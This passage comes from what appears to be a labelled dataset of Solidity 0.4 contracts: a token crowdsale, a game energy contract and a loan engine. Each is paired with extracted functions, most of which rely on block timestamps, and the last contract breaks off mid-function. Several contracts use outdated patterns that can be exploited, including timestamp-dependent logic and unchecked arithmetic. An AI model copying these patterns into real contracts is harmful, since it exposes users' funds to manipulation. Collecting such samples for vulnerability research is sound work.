  "content": "pragma solidity ^0.4.18;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n emit OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract Crowdsale {\n using SafeMath for uint256;\n ERC20 public token;\n address public wallet;\n uint256 public rate;\n uint256 public weiRaised;\n event TokenPurchase(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount);\n function Crowdsale(uint256 _rate, address _wallet, ERC20 _token) public {\n require(_rate > 0);\n require(_wallet != address(0));\n require(_token != address(0));\n rate = _rate;\n wallet = _wallet;\n token = _token;\n }\n function () external payable {\n buyTokens(msg.sender);\n }\n function buyTokens(address _beneficiary) public payable {\n uint256 weiAmount = msg.value;\n _preValidatePurchase(_beneficiary, weiAmount);\n uint256 tokens = _getTokenAmount(weiAmount);\n weiRaised = weiRaised.add(weiAmount);\n _processPurchase(_beneficiary, tokens);\n emit TokenPurchase(msg.sender, _beneficiary, weiAmount, tokens);\n _updatePurchasingState(_beneficiary, weiAmount);\n _forwardFunds();\n _postValidatePurchase(_beneficiary, weiAmount);\n }\n function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal {\n require(_beneficiary != address(0));\n require(_weiAmount != 0);\n }\n function _postValidatePurchase(address _beneficiary, uint256 _weiAmount) internal {\n }\n function _deliverTokens(address _beneficiary, uint256 _tokenAmount) internal {\n token.transfer(_beneficiary, _tokenAmount);\n }\n function _processPurchase(address _beneficiary, uint256 _tokenAmount) internal {\n _deliverTokens(_beneficiary, _tokenAmount);\n }\n function _updatePurchasingState(address _beneficiary, uint256 _weiAmount) internal {\n }\n function _getTokenAmount(uint256 _weiAmount) internal view returns (uint256) {\n return _weiAmount.mul(rate);\n }\n function _forwardFunds() internal {\n wallet.transfer(msg.value);\n }\n}\ncontract WhitelistedCrowdsale is Crowdsale, Ownable {\n mapping(address => bool) public whitelist;\n modifier isWhitelisted(address _beneficiary) {\n require(whitelist[_beneficiary]);\n _;\n }\n function addToWhitelist(address _beneficiary) external onlyOwner {\n whitelist[_beneficiary] = true;\n }\n function addManyToWhitelist(address[] _beneficiaries) external onlyOwner {\n for (uint256 i = 0; i < _beneficiaries.length; i++) {\n whitelist[_beneficiaries[i]] = true;\n }\n }\n function removeFromWhitelist(address _beneficiary) external onlyOwner {\n whitelist[_beneficiary] = false;\n }\n function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal isWhitelisted(_beneficiary) {\n super._preValidatePurchase(_beneficiary, _weiAmount);\n }\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n uint256 totalSupply_;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return balances[_owner];\n }\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n emit Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public view returns (uint256) {\n return allowed[_owner][_spender];\n }\n function increaseApproval(address _spender, uint _addedValue) public returns (bool) {\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract GStarToken is StandardToken, Ownable {\n using SafeMath for uint256;\n string public constant name = \"GSTAR Token\";\n string public constant symbol = \"GSTAR\";\n uint8 public constant decimals = 18;\n uint256 public constant INITIAL_SUPPLY = 1600000000 * ((10 ** uint256(decimals)));\n uint256 public currentTotalSupply = 0;\n event Burn(address indexed burner, uint256 value);\n function GStarToken() public {\n owner = msg.sender;\n totalSupply_ = INITIAL_SUPPLY;\n balances[owner] = INITIAL_SUPPLY;\n currentTotalSupply = INITIAL_SUPPLY;\n emit Transfer(address(0), owner, INITIAL_SUPPLY);\n }\n function burn(uint256 value) public onlyOwner {\n require(value <= balances[msg.sender]);\n address burner = msg.sender;\n balances[burner] = balances[burner].sub(value);\n currentTotalSupply = currentTotalSupply.sub(value);\n emit Burn(burner, value);\n }\n}\ncontract GStarCrowdsale is WhitelistedCrowdsale {\n using SafeMath for uint256;\n uint256 constant public presaleStartTime = 1531051200;\n uint256 constant public startTime = 1532260800;\n uint256 constant public endTime = 1534593600;\n mapping (address => uint256) public depositedTokens;\n uint256 constant public MINIMUM_PRESALE_PURCHASE_AMOUNT_IN_WEI = 1 ether;\n uint256 constant public MINIMUM_PURCHASE_AMOUNT_IN_WEI = 0.1 ether;\n uint256 public tokensWeiRaised = 0;\n uint256 constant public fundingGoal = 76000 ether;\n uint256 constant public presaleFundingGoal = 1000 ether;\n bool public fundingGoalReached = false;\n bool public presaleFundingGoalReached = false;\n uint256 public privateContribution = 0;\n bool public crowdsaleActive = false;\n bool public isCrowdsaleClosed = false;\n uint256 public tokensReleasedAmount = 0;\n event TokenPurchase(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount);\n event GoalReached(uint256 totalEtherAmountRaised);\n event PresaleGoalReached(uint256 totalEtherAmountRaised);\n event StartCrowdsale();\n event StopCrowdsale();\n event ReleaseTokens(address[] _beneficiaries);\n event Close();\n function GStarCrowdsale (\n uint256 _rate,\n address _wallet,\n GStarToken token\n ) public Crowdsale(_rate, _wallet, token) {\n }\n function buyTokens(address _beneficiary) public payable {\n uint256 weiAmount = msg.value;\n _preValidatePurchase(_beneficiary, weiAmount);\n uint256 tokens = _getTokenAmount(weiAmount);\n weiRaised = weiRaised.add(weiAmount);\n emit TokenPurchase(msg.sender, _beneficiary, weiAmount, tokens);\n _updatePurchasingState(_beneficiary, weiAmount);\n _forwardFunds();\n _processPurchase(_beneficiary, weiAmount);\n }\n function getRate() public view returns (uint256) {\n if (block.timestamp <= startTime) { return ((rate / 100) * 120); }\n if (block.timestamp <= startTime.add(1 days)) {return ((rate / 100) * 108);}\n return rate;\n }\n function changePrivateContribution(uint256 etherWeiAmount) external onlyOwner {\n privateContribution = etherWeiAmount;\n }\n function startCrowdsale() external onlyOwner {\n require(!crowdsaleActive);\n require(!isCrowdsaleClosed);\n crowdsaleActive = true;\n emit StartCrowdsale();\n }\n function stopCrowdsale() external onlyOwner {\n require(crowdsaleActive);\n crowdsaleActive = false;\n emit StopCrowdsale();\n }\n function releaseTokens(address[] contributors) external onlyOwner {\n for (uint256 j = 0; j < contributors.length; j++) {\n uint256 tokensAmount = depositedTokens[contributors[j]];\n if (tokensAmount > 0) {\n super._deliverTokens(contributors[j], tokensAmount);\n depositedTokens[contributors[j]] = 0;\n tokensReleasedAmount = tokensReleasedAmount.add(tokensAmount);\n }\n }\n }\n function close() external onlyOwner {\n crowdsaleActive = false;\n isCrowdsaleClosed = true;\n token.transfer(owner, token.balanceOf(address(this)));\n emit Close();\n }\n function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal {\n bool withinPeriod = now >= presaleStartTime && now <= endTime;\n bool atLeastMinimumAmount = false;\n if(block.timestamp <= startTime) {\n require(_weiAmount.add(weiRaised.add(privateContribution)) <= presaleFundingGoal);\n atLeastMinimumAmount = _weiAmount >= MINIMUM_PRESALE_PURCHASE_AMOUNT_IN_WEI;\n } else {\n atLeastMinimumAmount = _weiAmount >= MINIMUM_PURCHASE_AMOUNT_IN_WEI;\n }\n super._preValidatePurchase(_beneficiary, _weiAmount);\n require(msg.sender == _beneficiary);\n require(_weiAmount.add(weiRaised.add(privateContribution)) <= fundingGoal);\n require(withinPeriod);\n require(atLeastMinimumAmount);\n require(crowdsaleActive);\n }\n function _getTokenAmount(uint256 _weiAmount) internal view returns (uint256) {\n return _weiAmount.mul(getRate());\n }\n function _updatePurchasingState(address _beneficiary, uint256 _weiAmount) internal {\n tokensWeiRaised = tokensWeiRaised.add(_getTokenAmount(_weiAmount));\n _updateFundingGoal();\n }\n function _processPurchase(address _beneficiary, uint256 _tokenAmount) internal {\n depositedTokens[_beneficiary] = depositedTokens[_beneficiary].add(_getTokenAmount(_tokenAmount));\n }\n function _updateFundingGoal() internal {\n if (weiRaised.add(privateContribution) >= fundingGoal) {\n fundingGoalReached = true;\n emit GoalReached(weiRaised.add(privateContribution));\n }\n if(block.timestamp <= startTime) {\n if(weiRaised.add(privateContribution) >= presaleFundingGoal) {\n presaleFundingGoalReached = true;\n emit PresaleGoalReached(weiRaised.add(privateContribution));\n }\n }\n }\n}",
  "extract_feature": [
    "function getRate() public view returns (uint256) {\nif (block.timestamp <= startTime) { return ((rate / 100) * 120); }\nif (block.timestamp <= startTime.add(1 days)) {return ((rate / 100) * 108);}\nreturn rate;\n}",
    "function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal {\nbool withinPeriod = now >= presaleStartTime && now <= endTime;\nbool atLeastMinimumAmount = false;\nif(block.timestamp <= startTime) {\nrequire(_weiAmount.add(weiRaised.add(privateContribution)) <= presaleFundingGoal);\natLeastMinimumAmount = _weiAmount >= MINIMUM_PRESALE_PURCHASE_AMOUNT_IN_WEI;\n} else {\natLeastMinimumAmount = _weiAmount >= MINIMUM_PURCHASE_AMOUNT_IN_WEI;\n}\nsuper._preValidatePurchase(_beneficiary, _weiAmount);\nrequire(msg.sender == _beneficiary);\nrequire(_weiAmount.add(weiRaised.add(privateContribution)) <= fundingGoal);\nrequire(withinPeriod);\nrequire(atLeastMinimumAmount);\nrequire(crowdsaleActive);\n}",
    "function _updateFundingGoal() internal {\nif (weiRaised.add(privateContribution) >= fundingGoal) {\nfundingGoalReached = true;\nemit GoalReached(weiRaised.add(privateContribution));\n}\nif(block.timestamp <= startTime) {\nif(weiRaised.add(privateContribution) >= presaleFundingGoal) {\npresaleFundingGoalReached = true;\nemit PresaleGoalReached(weiRaised.add(privateContribution));\n}\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaaafa0e1460cdfa1f40"
  },
  "filename": "7593.sol",
  "content": "pragma solidity ^0.4.19;\ncontract BasicAccessControl {\n address public owner;\n uint16 public totalModerators = 0;\n mapping (address => bool) public moderators;\n bool public isMaintaining = false;\n function BasicAccessControl() public {\n owner = msg.sender;\n }\n modifier onlyOwner {\n require(msg.sender == owner);\n _;\n }\n modifier onlyModerators() {\n require(msg.sender == owner || moderators[msg.sender] == true);\n _;\n }\n modifier isActive {\n require(!isMaintaining);\n _;\n }\n function ChangeOwner(address _newOwner) onlyOwner public {\n if (_newOwner != address(0)) {\n owner = _newOwner;\n }\n }\n function AddModerator(address _newModerator) onlyOwner public {\n if (moderators[_newModerator] == false) {\n moderators[_newModerator] = true;\n totalModerators += 1;\n }\n }\n function RemoveModerator(address _oldModerator) onlyOwner public {\n if (moderators[_oldModerator] == true) {\n moderators[_oldModerator] = false;\n totalModerators -= 1;\n }\n }\n function UpdateMaintaining(bool _isMaintaining) onlyOwner public {\n isMaintaining = _isMaintaining;\n }\n}\ncontract EtheremonEnergy is BasicAccessControl {\n struct Energy {\n uint freeAmount;\n uint paidAmount;\n uint lastClaim;\n }\n struct EnergyPackage {\n uint ethPrice;\n uint emontPrice;\n uint energy;\n }\n mapping(address => Energy) energyData;\n mapping(uint => EnergyPackage) paidPackages;\n uint public claimMaxAmount = 10;\n uint public claimTime = 30 * 60;\n uint public claimAmount = 1;\n address public paymentContract;\n event EventEnergyUpdate(address indexed player, uint freeAmount, uint paidAmount, uint lastClaim);\n modifier requirePaymentContract {\n require(paymentContract != address(0));\n _;\n }\n function EtheremonEnergy(address _paymentContract) public {\n paymentContract = _paymentContract;\n }\n function withdrawEther(address _sendTo, uint _amount) onlyModerators public {\n if (_amount > address(this).balance) {\n revert();\n }\n _sendTo.transfer(_amount);\n }\n function setPaidPackage(uint _packId, uint _ethPrice, uint _emontPrice, uint _energy) onlyModerators external {\n EnergyPackage storage pack = paidPackages[_packId];\n pack.ethPrice = _ethPrice;\n pack.emontPrice = _emontPrice;\n pack.energy = _energy;\n }\n function setConfig(address _paymentContract, uint _claimMaxAmount, uint _claimTime, uint _claimAmount) onlyModerators external {\n paymentContract = _paymentContract;\n claimMaxAmount = _claimMaxAmount;\n claimTime = _claimTime;\n claimAmount = _claimAmount;\n }\n function topupEnergyByToken(address _player, uint _packId, uint _token) requirePaymentContract external {\n if (msg.sender != paymentContract) revert();\n EnergyPackage storage pack = paidPackages[_packId];\n if (pack.energy == 0 || pack.emontPrice != _token)\n revert();\n Energy storage energy = energyData[_player];\n energy.paidAmount += pack.energy;\n EventEnergyUpdate(_player, energy.freeAmount, energy.paidAmount, energy.lastClaim);\n }\n function safeDeduct(uint _a, uint _b) pure public returns(uint) {\n if (_a < _b) return 0;\n return (_a - _b);\n }\n function topupEnergy(uint _packId) isActive payable external {\n EnergyPackage storage pack = paidPackages[_packId];\n if (pack.energy == 0 || pack.ethPrice != msg.value)\n revert();\n Energy storage energy = energyData[msg.sender];\n energy.paidAmount += pack.energy;\n EventEnergyUpdate(msg.sender, energy.freeAmount, energy.paidAmount, energy.lastClaim);\n }\n function claimEnergy() isActive external {\n Energy storage energy = energyData[msg.sender];\n uint period = safeDeduct(block.timestamp, energy.lastClaim);\n uint energyAmount = (period / claimTime) * claimAmount;\n if (energyAmount == 0) revert();\n if (energyAmount > claimMaxAmount) energyAmount = claimMaxAmount;\n energy.freeAmount += energyAmount;\n energy.lastClaim = block.timestamp;\n EventEnergyUpdate(msg.sender, energy.freeAmount, energy.paidAmount, energy.lastClaim);\n }\n function getPlayerEnergy(address _player) constant external returns(uint freeAmount, uint paidAmount, uint lastClaim) {\n Energy storage energy = energyData[_player];\n return (energy.freeAmount, energy.paidAmount, energy.lastClaim);\n }\n function getClaimableAmount(address _trainer) constant external returns(uint) {\n Energy storage energy = energyData[_trainer];\n uint period = safeDeduct(block.timestamp, energy.lastClaim);\n uint energyAmount = (period / claimTime) * claimAmount;\n if (energyAmount > claimMaxAmount) energyAmount = claimMaxAmount;\n return energyAmount;\n }\n}",
  "extract_feature": [
    "function claimEnergy() isActive external {\nEnergy storage energy = energyData[msg.sender];\nuint period = safeDeduct(block.timestamp, energy.lastClaim);\nuint energyAmount = (period / claimTime) * claimAmount;\nif (energyAmount == 0) revert();\nif (energyAmount > claimMaxAmount) energyAmount = claimMaxAmount;\nenergy.freeAmount += energyAmount;\nenergy.lastClaim = block.timestamp;\nEventEnergyUpdate(msg.sender, energy.freeAmount, energy.paidAmount, energy.lastClaim);\n}",
    "function getClaimableAmount(address _trainer) constant external returns(uint) {\nEnergy storage energy = energyData[_trainer];\nuint period = safeDeduct(block.timestamp, energy.lastClaim);\nuint energyAmount = (period / claimTime) * claimAmount;\nif (energyAmount > claimMaxAmount) energyAmount = claimMaxAmount;\nreturn energyAmount;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaaafa0e1460cdfa1f41"
  },
  "filename": "7627.sol",
  "content": "pragma solidity ^0.4.24;\ncontract Engine {\n uint256 public VERSION;\n string public VERSION_NAME;\n enum Status { initial, lent, paid, destroyed }\n struct Approbation {\n bool approved;\n bytes data;\n bytes32 checksum;\n }\n function getTotalLoans() public view returns (uint256);\n function getOracle(uint index) public view returns (Oracle);\n function getBorrower(uint index) public view returns (address);\n function getCosigner(uint index) public view returns (address);\n function ownerOf(uint256) public view returns (address owner);\n function getCreator(uint index) public view returns (address);\n function getAmount(uint index) public view returns (uint256);\n function getPaid(uint index) public view returns (uint256);\n function getDueTime(uint index) public view returns (uint256);\n function getApprobation(uint index, address _address) public view returns (bool);\n function getStatus(uint index) public view returns (Status);\n function isApproved(uint index) public view returns (bool);\n function getPendingAmount(uint index) public returns (uint256);\n function getCurrency(uint index) public view returns (bytes32);\n function cosign(uint index, uint256 cost) external returns (bool);\n function approveLoan(uint index) public returns (bool);\n function transfer(address to, uint256 index) public returns (bool);\n function takeOwnership(uint256 index) public returns (bool);\n function withdrawal(uint index, address to, uint256 amount) public returns (bool);\n}\ncontract Cosigner {\n uint256 public constant VERSION = 2;\n function url() public view returns (string);\n function cost(address engine, uint256 index, bytes data, bytes oracleData) public view returns (uint256);\n function requestCosign(Engine engine, uint256 index, bytes data, bytes oracleData) public returns (bool);\n function claim(address engine, uint256 index, bytes oracleData) public returns (bool);\n}\ncontract ERC721 {\n function name() public view returns (string _name);\n function symbol() public view returns (string _symbol);\n function totalSupply() public view returns (uint256 _totalSupply);\n function balanceOf(address _owner) public view returns (uint _balance);\n function ownerOf(uint256) public view returns (address owner);\n function approve(address, uint256) public returns (bool);\n function takeOwnership(uint256) public returns (bool);\n function transfer(address, uint256) public returns (bool);\n function setApprovalForAll(address _operator, bool _approved) public returns (bool);\n function getApproved(uint256 _tokenId) public view returns (address);\n function isApprovedForAll(address _owner, address _operator) public view returns (bool);\n function tokenMetadata(uint256 _tokenId) public view returns (string info);\n event Transfer(address indexed _from, address indexed _to, uint256 _tokenId);\n event Approval(address indexed _owner, address indexed _approved, uint256 _tokenId);\n event ApprovalForAll(address indexed _owner, address indexed _operator, bool _approved);\n}\ncontract Token {\n function transfer(address _to, uint _value) public returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\n function allowance(address _owner, address _spender) public view returns (uint256 remaining);\n function approve(address _spender, uint256 _value) public returns (bool success);\n function increaseApproval (address _spender, uint _addedValue) public returns (bool success);\n function balanceOf(address _owner) public view returns (uint256 balance);\n}\ncontract Ownable {\n address public owner;\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function Ownable() public {\n owner = msg.sender;\n }\n function transferTo(address _to) public onlyOwner returns (bool) {\n require(_to != address(0));\n owner = _to;\n return true;\n }\n}\ncontract Oracle is Ownable {\n uint256 public constant VERSION = 3;\n event NewSymbol(bytes32 _currency, string _ticker);\n struct Symbol {\n string ticker;\n bool supported;\n }\n mapping(bytes32 => Symbol) public currencies;\n function url() public view returns (string);\n function getRate(bytes32 symbol, bytes data) public returns (uint256 rate, uint256 decimals);\n function addCurrency(string ticker) public onlyOwner returns (bytes32) {\n NewSymbol(currency, ticker);\n bytes32 currency = keccak256(ticker);\n currencies[currency] = Symbol(ticker, true);\n return currency;\n }\n function supported(bytes32 symbol) public view returns (bool) {\n return currencies[symbol].supported;\n }\n}\ncontract RpSafeMath {\n function safeAdd(uint256 x, uint256 y) internal pure returns(uint256) {\n uint256 z = x + y;\n require((z >= x) && (z >= y));\n return z;\n }\n function safeSubtract(uint256 x, uint256 y) internal pure returns(uint256) {\n require(x >= y);\n uint256 z = x - y;\n return z;\n }\n function safeMult(uint256 x, uint256 y) internal pure returns(uint256) {\n uint256 z = x * y;\n require((x == 0)||(z/x == y));\n return z;\n }\n function min(uint256 a, uint256 b) internal pure returns(uint256) {\n if (a < b) {\n return a;\n } else {\n return b;\n }\n }\n function max(uint256 a, uint256 b) internal pure returns(uint256) {\n if (a > b) {\n return a;\n } else {\n return b;\n }\n }\n}\ncontract TokenLockable is RpSafeMath, Ownable {\n mapping(address => uint256) public lockedTokens;\n function lockTokens(address token, uint256 amount) internal {\n lockedTokens[token] = safeAdd(lockedTokens[token], amount);\n }\n function unlockTokens(address token, uint256 amount) internal {\n lockedTokens[token] = safeSubtract(lockedTokens[token], amount);\n }\n function withdrawTokens(Token token, address to, uint256 amount) public onlyOwner returns (bool) {\n require(safeSubtract(token.balanceOf(this), lockedTokens[token]) >= amount);\n require(to != address(0));\n return token.transfer(to, amount);\n }\n}\ncontract NanoLoanEngine is ERC721, Engine, Ownable, TokenLockable {\n uint256 constant internal PRECISION = (10**18);\n uint256 constant internal RCN_DECIMALS = 18;\n uint256 public constant VERSION = 233;\n string public constant VERSION_NAME = \"Basalt\";\n uint256 private activeLoans = 0;\n mapping(address => uint256) private lendersBalance;\n function name() public view returns (string _name) {\n _name = \"RCN - Nano loan engine - Basalt 233\";\n }\n function symbol() public view returns (string _symbol) {\n _symbol = \"RCN-NLE-233\";\n }\n function totalSupply() public view returns (uint _totalSupply) {\n _totalSupply = activeLoans;\n }\n function balanceOf(address _owner) public view returns (uint _balance) {\n _balance = lendersBalance[_owner];\n }\n function tokensOfOwner(address _owner) external view returns(uint256[] ownerTokens) {\n uint256 tokenCount = balanceOf(_owner);\n if (tokenCount == 0) {\n return new uint256[](0);\n } else {\n uint256[] memory result = new uint256[](tokenCount);\n uint256 totalLoans = loans.length - 1;\n uint256 resultIndex = 0;\n uint256 loanId;\n for (loanId = 0; loanId <= totalLoans; loanId++) {\n if (loans[loanId].lender == _owner && loans[loanId].status == Status.lent) {\n result[resultIndex] = loanId;\n resultIndex++;\n }\n }\n return result;\n }\n }\n function isApprovedForAll(address _owner, address _operator) public view returns (bool) {\n return operators[_owner][_operator];\n }\n function tokenMetadata(uint256 index) public view returns (string) {\n return loans[index].metadata;\n }\n function tokenMetadataHash(uint256 index) public view returns (bytes32) {\n return keccak256(loans[index].metadata);\n }\n Token public rcn;\n bool public deprecated;\n event CreatedLoan(uint _index, address _borrower, address _creator);\n event ApprovedBy(uint _index, address _address);\n event Lent(uint _index, address _lender, address _cosigner);\n event DestroyedBy(uint _index, address _address);\n event PartialPayment(uint _index, address _sender, address _from, uint256 _amount);\n event TotalPayment(uint _index);\n function NanoLoanEngine(Token _rcn) public {\n owner = msg.sender;\n rcn = _rcn;\n loans.length++;\n }\n struct Loan {\n Status status;\n Oracle oracle;\n address borrower;\n address lender;\n address creator;\n address cosigner;\n uint256 amount;\n uint256 interest;\n uint256 punitoryInterest;\n uint256 interestTimestamp;\n uint256 paid;\n uint256 interestRate;\n uint256 interestRatePunitory;\n uint256 dueTime;\n uint256 duesIn;\n bytes32 currency;\n uint256 cancelableAt;\n uint256 lenderBalance;\n address approvedTransfer;\n uint256 expirationRequest;\n string metadata;\n mapping(address => bool) approbations;\n }\n mapping(address => mapping(address => bool)) private operators;\n mapping(bytes32 => uint256) public identifierToIndex;\n Loan[] private loans;\n function createLoan(Oracle _oracleContract, address _borrower, bytes32 _currency, uint256 _amount, uint256 _interestRate,\n uint256 _interestRatePunitory, uint256 _duesIn, uint256 _cancelableAt, uint256 _expirationRequest, string _metadata) public returns (uint256) {\n require(!deprecated);\n require(_cancelableAt <= _duesIn);\n require(_oracleContract != address(0) || _currency == 0x0);\n require(_borrower != address(0));\n require(_amount != 0);\n require(_interestRatePunitory != 0);\n require(_interestRate != 0);\n require(_expirationRequest > block.timestamp);\n var loan = Loan(Status.initial, _oracleContract, _borrower, 0x0, msg.sender, 0x0, _amount, 0, 0, 0, 0, _interestRate,\n _interestRatePunitory, 0, _duesIn, _currency, _cancelableAt, 0, 0x0, _expirationRequest, _metadata);\n uint index = loans.push(loan) - 1;\n CreatedLoan(index, _borrower, msg.sender);\n bytes32 identifier = getIdentifier(index);\n require(identifierToIndex[identifier] == 0);\n identifierToIndex[identifier] = index;\n if (msg.sender == _borrower) {\n approveLoan(index);\n }\n return index;\n }\n function ownerOf(uint256 index) public view returns (address owner) { owner = loans[index].lender; }\n function getTotalLoans() public view returns (uint256) { return loans.length; }\n function getOracle(uint index) public view returns (Oracle) { return loans[index].oracle; }\n function getBorrower(uint index) public view returns (address) { return loans[index].borrower; }\n function getCosigner(uint index) public view returns (address) { return loans[index].cosigner; }\n function getCreator(uint index) public view returns (address) { return loans[index].creator; }\n function getAmount(uint index) public view returns (uint256) { return loans[index].amount; }\n function getPunitoryInterest(uint index) public view returns (uint256) { return loans[index].punitoryInterest; }\n function getInterestTimestamp(uint index) public view returns (uint256) { return loans[index].interestTimestamp; }\n function getPaid(uint index) public view returns (uint256) { return loans[index].paid; }\n function getInterestRate(uint index) public view returns (uint256) { return loans[index].interestRate; }\n function getInterestRatePunitory(uint index) public view returns (uint256) { return loans[index].interestRatePunitory; }\n function getDueTime(uint index) public view returns (uint256) { return loans[index].dueTime; }\n function getDuesIn(uint index) public view returns (uint256) { return loans[index].duesIn; }\n function getCancelableAt(uint index) public view returns (uint256) { return loans[index].cancelableAt; }\n function getApprobation(uint index, address _address) public view returns (bool) { return loans[index].approbations[_address]; }\n function getStatus(uint index) public view returns (Status) { return loans[index].status; }\n function getLenderBalance(uint index) public view returns (uint256) { return loans[index].lenderBalance; }\n function getApproved(uint index) public view returns (address) {return loans[index].approvedTransfer; }\n function getCurrency(uint index) public view returns (bytes32) { return loans[index].currency; }\n function getExpirationRequest(uint index) public view returns (uint256) { return loans[index].expirationRequest; }\n function getInterest(uint index) public view returns (uint256) { return loans[index].interest; }\n function getIdentifier(uint index) public view returns (bytes32) {\n Loan memory loan = loans[index];\n return buildIdentifier(loan.oracle, loan.borrower, loan.creator, loan.currency, loan.amount, loan.interestRate,\n loan.interestRatePunitory, loan.duesIn, loan.cancelableAt, loan.expirationRequest, loan.metadata);\n }\n function buildIdentifier(Oracle oracle, address borrower, address creator, bytes32 currency, uint256 amount, uint256 interestRate,\n uint256 interestRatePunitory, uint256 duesIn, uint256 cancelableAt, uint256 expirationRequest, string metadata) view returns (bytes32) {\n return keccak256(this, oracle, borrower, creator, currency, amount, interestRate, interestRatePunitory, duesIn,\n cancelableAt, expirationRequest, metadata);\n }\n function isApproved(uint index) public view returns (bool) {\n Loan storage loan = loans[index];\n return loan.approbations[loan.borrower];\n }\n function approveLoan(uint index) public returns(bool) {\n Loan storage loan = loans[index];\n require(loan.status == Status.initial);\n loan.approbations[msg.sender] = true;\n ApprovedBy(index, msg.sender);\n return true;\n }\n function approveLoanIdentifier(bytes32 identifier) public returns (bool) {\n uint256 index = identifierToIndex[identifier];\n require(index != 0);\n return approveLoan(index);\n }\n function registerApprove(bytes32 identifier, uint8 v, bytes32 r, bytes32 s) public returns (bool) {\n uint256 index = identifierToIndex[identifier];\n require(index != 0);\n Loan storage loan = loans[index];\n require(loan.borrower == ecrecover(keccak256(\"\\x19Ethereum Signed Message:\\n32\", identifier), v, r, s));\n loan.approbations[loan.borrower] = true;\n ApprovedBy(index, loan.borrower);\n return true;\n }\n function lend(uint index, bytes oracleData, Cosigner cosigner, bytes cosignerData) public returns (bool) {\n Loan storage loan = loans[index];\n require(loan.status == Status.initial);\n require(isApproved(index));\n require(block.timestamp <= loan.expirationRequest);\n loan.lender = msg.sender;\n loan.dueTime = safeAdd(block.timestamp, loan.duesIn);\n loan.interestTimestamp = block.timestamp;\n loan.status = Status.lent;\n Transfer(0x0, loan.lender, index);\n activeLoans += 1;\n lendersBalance[loan.lender] += 1;\n if (loan.cancelableAt > 0)\n internalAddInterest(loan, safeAdd(block.timestamp, loan.cancelableAt));\n uint256 transferValue = convertRate(loan.oracle, loan.currency, oracleData, loan.amount);\n require(rcn.transferFrom(msg.sender, loan.borrower, transferValue));\n if (cosigner != address(0)) {\n loan.cosigner = address(uint256(cosigner) + 2);\n require(cosigner.requestCosign(this, index, cosignerData, oracleData));\n require(loan.cosigner == address(cosigner));\n }\n Lent(index, loan.lender, cosigner);\n return true;\n }\n function cosign(uint index, uint256 cost) external returns (bool) {\n Loan storage loan = loans[index];\n require(loan.status == Status.lent && (loan.dueTime - loan.duesIn) == block.timestamp);\n require(loan.cosigner != address(0));\n require(loan.cosigner == address(uint256(msg.sender) + 2));\n loan.cosigner = msg.sender;\n require(rcn.transferFrom(loan.lender, msg.sender, cost));\n return true;\n }\n function destroy(uint index) public returns (bool) {\n Loan storage loan = loans[index];\n require(loan.status != Status.destroyed);\n require(msg.sender == loan.lender || (msg.sender == loan.borrower && loan.status == Status.initial));\n DestroyedBy(index, msg.sender);\n if (loan.status != Status.initial) {\n lendersBalance[loan.lender] -= 1;\n activeLoans -= 1;\n Transfer(loan.lender, 0x0, index);\n }\n loan.status = Status.destroyed;\n return true;\n }\n function destroyIdentifier(bytes32 identifier) public returns (bool) {\n uint256 index = identifierToIndex[identifier];\n require(index != 0);\n return 